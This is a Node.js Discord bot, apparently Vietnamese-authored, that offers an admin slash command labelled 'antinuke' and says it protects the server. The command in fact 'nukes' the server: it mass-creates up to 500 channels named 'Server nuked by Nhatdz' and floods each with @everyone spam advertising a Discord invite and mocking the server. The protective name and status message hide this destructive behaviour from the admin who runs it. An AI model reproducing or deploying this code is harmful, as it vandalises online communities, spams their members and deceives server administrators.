import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  PermissionFlagsBits,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server cho Render ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000, () =>
  console.log("🌐 Web server running")
);
/* ===================================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

// ===== CONFIG =====
const MAX_TOTAL = 510;
const MAX_PER_RUN = 500;
const CHANNEL_NAME = "Server nuked by Nhatdz";
// ==================

const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("AntiNuke cho server")
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  try {
    console.log("🔁 Đăng slash command...");
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log("✅ Xong!");
  } catch (e) {
    console.error(e);
  }
})();

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag}`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "antinuke") return;

  if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
    return interaction.reply({ content: "❌ Bạn không có quyền admin.", ephemeral: true });
  }

  const guild = interaction.guild;

  const existing = guild.channels.cache.filter(
    c => c.type === ChannelType.GuildText && c.name === CHANNEL_NAME
  ).size;

  if (existing >= MAX_TOTAL) {
    return interaction.reply({
      content: `❌ Đã có ${existing}/${MAX_TOTAL} kênh "${CHANNEL_NAME}".`,
      ephemeral: true
    });
  }

  const canCreate = Math.min(MAX_PER_RUN, MAX_TOTAL - existing);

  await interaction.reply({
    content: `⚡ Đang Bảo Vệ Server`,
    ephemeral: true
  });

  const tasks = [];
  for (let i = 0; i < canCreate; i++) {
    tasks.push((async () => {
      const ch = await guild.channels.create({
        name: CHANNEL_NAME,
        type: ChannelType.GuildText
      });

      // Gửi 3 tin nhắn
      await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
      await sleep(200);
      await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
      await sleep(200);
      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
      await sleep(200);
      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
      await sleep(200);
      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
      await sleep(200);
      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
      await sleep(200);
      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
    })());
  }

  await Promise.all(tasks);

  await interaction.followUp({
    content: `✅ Đã tạo ${canCreate} kênh.`,
    ephemeral: true
  });
});

client.login(process.env.BOT_TOKEN);
